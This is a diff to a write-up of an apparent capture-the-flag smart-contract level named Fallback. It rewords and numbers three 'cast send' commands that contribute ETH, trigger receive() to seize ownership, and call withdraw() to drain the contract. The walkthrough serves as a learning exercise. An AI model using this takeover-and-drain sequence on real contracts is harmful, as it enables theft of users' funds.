@@ -56,20 +56,20 @@ contract Fallback {
 
 ## Solution
 
-We need to trigger the callback function after having contributed some ETH to become the owner.
+To become the contract owner, we first need to contribute some ETH and then call the fallback function.
 
 ### Walkthrough
-Contributing some eth using the "contribute()" function
+1. Contributing some eth using the "contribute()" function
 ```
 cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
 ```
 
-Triggering the fallback function **receive()** by sending a eth transaction with an empty data field
+2. Triggering the fallback function **receive()** by sending an eth transaction with an empty data field
 ```
 cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
 ```
 
-Draining the contract
+3. Draining the contract
 ```
 cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
 ```
